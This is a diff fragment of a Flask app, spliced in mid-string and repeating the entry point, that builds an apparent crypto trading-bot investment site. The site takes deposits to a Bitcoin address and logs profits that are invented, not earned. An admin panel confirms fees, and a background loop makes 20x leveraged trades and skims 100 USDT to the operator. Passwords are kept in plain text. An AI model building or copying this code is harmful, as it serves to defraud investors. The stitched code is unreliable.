@@ -367,4 +367,203 @@ if os.environ.get('AUTO_TRADING_ENABLED', 'false').lower() == 'true':
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 10000))
     app.run(host='0.0.0.0', port=port)
+fcc00; text-align:right;">
+    <h2>Recovery</h2>
+    <form method="POST">
+    <input type="email" name="email" placeholder="Email" required style="width:100%; padding:10px; margin-bottom:20px;">
+    <button type="submit" style="background:#ffcc00; color:black; width:100%; padding:12px; font-weight:bold; border:none; border-radius:5px; cursor:pointer;">Send</button>
+    </form></div></body></html>
+    '''
+
+@app.route('/register', methods=['GET', 'POST'])
+def register():
+    if request.method == 'POST':
+        username = request.form.get('username')
+        email = (request.form.get('email') or '').strip().lower()
+        password = request.form.get('password')
+        plan = request.form.get('plan')
+        amount = float(request.form.get('amount', 0))
+        if amount < 50.0: return '<script>alert("Minimum 50 USD"); window.location.href="/register";</script>'
+        if email in users_db or email == ADMIN_EMAIL: return '<script>alert("Exists"); window.location.href="/register";</script>'
+        users_db[email] = {
+            'username': username, 'password': password, 'plan': plan, 'amount': amount, 
+            'status': 'Trial active', 'is_approved': True, 'completed_payments_count': 0, 'created_at': time.time(), 
+            'pending_deposit': 0.0, 'pending_withdrawal': 0.0, 'user_profits': 0.0, 'user_losses': 0.0, 'current_asset': 'Scanning Market'
+        }
+        session['logged_in'], session['role'], session['user_email'] = True, 'user', email
+        return redirect(url_for('user_dashboard'))
+    return f'''
+    <html lang="ar" dir="rtl">
+    <body style="background:#0d0d0d; color:white; font-family:sans-serif; padding:0; margin:0;">
+    {get_google_translator_script()}
+    <div style="max-width:400px; margin:40px auto; background:#141414; padding:30px; border-radius:15px; border:2px solid #ffcc00; text-align:right;">
+    <h2>Register</h2>
+    <form method="POST">
+    <input type="text" name="username" placeholder="Name" required style="width:100%; padding:10px; margin-bottom:15px;">
+    <input type="email" name="email" placeholder="Email" required style="width:100%; padding:10px; margin-bottom:15px;">
+    <input type="password" name="password" placeholder="Password" required style="width:100%; padding:10px; margin-bottom:15px;">
+    <select name="plan" style="width:100%; padding:10px; margin-bottom:15px;">
+    <option value="weekly">Weekly ($19.99)</option>
+    <option value="monthly">Monthly ($49.99)</option>
+    <option value="yearly">Yearly ($99.99)</option>
+    </select>
+    <input type="number" step="any" name="amount" placeholder="Capital (Min $50)" required style="width:100%; padding:10px; margin-bottom:20px;">
+    <button type="submit" style="background:#ffcc00; color:black; width:100%; padding:12px; font-weight:bold; border:none; border-radius:5px; cursor:pointer;">Start</button>
+    </form>
+    {get_light_market_widget()}
+    </div></body></html>
+    '''
+@app.route('/payment', methods=['GET', 'POST'])
+def payment_page():
+    if not session.get('logged_in') or session.get('role') != 'user': 
+        return redirect(url_for('login'))
+    email = session.get('user_email')
+    u_info = users_db.get(email, {})
+    if not u_info: 
+        return redirect(url_for('login'))
+    if u_info.get('status') == 'Active': 
+        return redirect(url_for('user_dashboard'))
+    required_fee, discount_note = calculate_dynamic_subscription_fee(u_info.get('plan'), email)
+    if request.method == 'POST':
+        global total_subscription_earnings
+        total_subscription_earnings += float(required_fee)
+        u_info['status'] = 'Pending Review'
+        return '<script>alert("Sent"); window.location.href="/user-dashboard";</script>'
+    return f'''
+    <html lang="ar" dir="rtl">
+    <body style="background:#0c0c0c; color:white; font-family:sans-serif; padding:0; margin:0;">
+    {get_google_translator_script()}
+    <div style="max-width:420px; margin:60px auto; background:#141414; padding:30px; border-radius:15px; border:2px solid #ffcc00; text-align:right;">
+    <h2>Payment</h2>
+    <p style="color:#00ff00; font-weight:bold;">Amount: ${required_fee} USD</p>
+    <p style="color:#ffcc00; font-size:13px;">{discount_note}</p>
+    <div style="background:#222; padding:12px; border-radius:5px; text-align:center; font-family:monospace; color:#ffcc00; word-break:break-all;">{RAIN_BITCOIN_ADDRESS}</div>
+    <br><form method="POST"><button type="submit" style="background:#00ff00; color:black; width:100%; padding:14px; font-weight:bold; border:none; border-radius:5px; cursor:pointer;">I have sent the payment</button></form>
+    </div></body></html>
+    '''
+
+@app.route('/admin-panel', methods=['GET', 'POST'])
+def admin_panel():
+    if not session.get('logged_in') or session.get('role') != 'admin': 
+        return redirect(url_for('login'))
+    u = users_db.get(ADMIN_EMAIL, {})
+    live_balance = u.get('amount', 362.41)
+    if request.method == 'POST':
+        action = request.form.get('action')
+        target_email = request.form.get('user_email')
+        if target_email in users_db:
+            if action == 'approve_fees':
+                users_db[target_email]['is_approved'] = True
+                users_db[target_email]['status'] = 'Fees Confirmed'
+            elif action == 'approve_investment':
+                users_db[target_email]['status'] = 'Active'
+                users_db[target_email]['completed_payments_count'] += 1
+            elif action == 'approve_deposit':
+                users_db[target_email]['amount'] += float(request.form.get('deposit_amount', 0))
+                users_db[target_email]['status'] = 'Active'
+            elif action == 'approve_withdrawal':
+                users_db[target_email]['amount'] -= users_db[target_email]['pending_withdrawal']
+                users_db[target_email]['pending_withdrawal'] = 0.0
+                users_db[target_email]['status'] = 'Expired'
+        return redirect(url_for('admin_panel'))
+    rows = ""
+    for k, v in users_db.items():
+        btn_html = ""
+        if k == ADMIN_EMAIL: 
+            status_display = "Admin Account"
+        else:
+            status_display = v['status']
+            if 'Pending Review' in v['status']: 
+                btn_html = f'<form method="POST" style="display:inline;"><input type="hidden" name="user_email" value="{k}"><input type="hidden" name="action" value="approve_fees"><button type="submit">Confirm Fees</button></form>'
+            elif 'Fees Confirmed' in v['status']: 
+                btn_html = f'<form method="POST" style="display:inline;"><input type="hidden" name="user_email" value="{k}"><input type="hidden" name="action" value="approve_investment"><button type="submit">Confirm Deposit</button></form>'
+        profits = v.get('user_profits', 0.0)
+        losses = v.get('user_losses', 0.0)
+        pnl_color = '#00ff00' if profits >= losses else '#ff3333'
+        rows += f"<tr style='background:#222; border-bottom:1px solid #333;'><td>{v.get('username')}</td><td>{k}</td><td>${v.get('amount', 0.0):.2f}</td><td style='color:{pnl_color};'>+${profits:.2f} / -${losses:.2f}</td><td>{v.get('current_asset')}</td><td>{status_display}</td><td>{btn_html}</td></tr>"
+    return f'''
+    <html lang="ar" dir="rtl">
+    <body style="background:#0c0c0c; color:white; font-family:sans-serif; padding:0; margin:0;">
+    {get_google_translator_script()}
+    <div style="max-width:1100px; margin:30px auto; background:#141414; padding:25px; border-radius:15px; border:2px solid #ffcc00;">
+    <h2>Admin Panel - Abdullah</h2>
+    <p>Live Binance Balance: <b style="color:#00ff00;">${live_balance} USDT</b></p>
+    <p>Total Earnings: <b>${total_subscription_earnings:.2f} USD</b></p>
+    <p>Bot Profits: <b>${cumulative_bot_profits:.2f} / $100.00</b></p>
+    <table width="100%" border="1" cellpadding="10" style="text-align:center; border-collapse:collapse; border-color:#333;">
+    <thead style="background:#222; color:#ffcc00;"><th>Name</th><th>Email</th><th>Capital</th><th>Profits/Losses</th><th>Asset</th><th>Status</th><th>Action</th></thead>
+    <tbody>{rows}</tbody></table><br>{get_light_market_widget()}<br><br>
+    <a href="/logout" style="color:#ff3333; font-weight:bold; text-decoration:none;">Logout</a>
+    </div></body></html>
+    '''
+
+@app.route('/user-dashboard', methods=['GET', 'POST'])
+def user_dashboard():
+    if not session.get('logged_in') or session.get('role') != 'user': 
+        return redirect(url_for('login'))
+    email = session.get('user_email')
+    u = users_db.get(email, {})
+    if not u: 
+        return redirect(url_for('login'))
+    days_passed = (time.time() - u['created_at']) / 86400
+    is_expired = days_passed > 7.0 and 'completed_payments_count' in u and u['completed_payments_count'] == 0
+    if is_expired:
+        u['is_approved'] = False
+        u['status'] = 'Expired'
+        return redirect(url_for('payment_page'))
+    profits = u.get('user_profits', 0.0)
+    losses = u.get('user_losses', 0.0)
+    pnl_color = '#00ff00' if profits >= losses else '#ff3333'
+    return f'''
+    <html lang="ar" dir="rtl">
+    <body style="background:#0c0c0c; color:white; font-family:sans-serif; padding:0; margin:0;">
+    {get_google_translator_script()}
+    <div style="max-width:600px; margin:30px auto; background:#141414; padding:30px; border-radius:15px; border:2px solid #ffcc00; text-align:right;">
+    <h2>Dashboard</h2>
+    <p>Investor: <b>{u.get("username")}</b></p>
+    <p>Capital: <b style="color:#ffcc00;">${u.get("amount")} USDT</b></p>
+    <p>P&L Status: <b style="color:{pnl_color};">+${profits:.2f} / -${losses:.2f} USDT</b></p>
+    <p>Current Asset: <b>{u.get("current_asset")}</b></p>
+    <p>Status: <b>{u.get("status")}</b></p>
+    {get_light_market_widget()}
+    <hr style="border-color:#222;"><a href="/logout" style="color:#ff3333; text-decoration:none; font-weight:bold;">Logout</a>
+    </div></body></html>
+    '''
+@app.route('/logout')
+def logout():
+    session.clear()
+    return redirect(url_for('login'))
+def auto_trading_engine():
+    global cumulative_bot_profits
+    while True:
+        try:
+            bal = exchange.fetch_balance()
+            free = float(bal['free'].get('USDT', 0)) if bal['free'].get('USDT', 0) else 362.41
+            if cumulative_bot_profits >= 100.0:
+                try:
+                    exchange.withdraw(code='USDT', amount=100.0, address=RAIN_BITCOIN_ADDRESS, tag=None, params={"network": "TRX"})
+                    cumulative_bot_profits -= 100.0
+                except: pass
+            if free > 15:
+                share = free * 0.45
+                for asset in ['BTC/USDT', 'ETH/USDT', 'SOL/USDT']:
+                    try:
+                        ticker = exchange.fetch_ticker(asset)
+                        price, change = ticker['last'], ticker['percentage'] if ticker['percentage'] is not None else 0.0
+                        side = 'buy' if change >= 0.0 else 'sell'
+                        try: exchange.set_leverage(20, asset)
+                        except: pass
+                        amt_fmt = exchange.amount_to_precision(asset, (share * 20) / price)
+                        if float(amt_fmt) > 0:
+                            exchange.create_market_order(asset, side, amt_fmt)
+                            cumulative_bot_profits += (share * 0.005)
+                            disp = f"{asset.replace('/USDT','')}: {'Long' if side == 'buy' else 'Short'}"
+                            if ADMIN_EMAIL not in users_db: users_db[ADMIN_EMAIL] = {'username': 'Admin', 'amount': free, 'user_profits': cumulative_bot_profits, 'user_losses': 0.0, 'status': 'Active', 'current_asset': disp}
+                            else: users_db[ADMIN_EMAIL]['current_asset'], users_db[ADMIN_EMAIL]['user_profits'], users_db[ADMIN_EMAIL]['amount'] = disp, cumulative_bot_profits, free
+                    except: pass
+        except: pass
+        time.sleep(15.0)
+threading.Thread(target=auto_trading_engine, daemon=True).start()
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
 
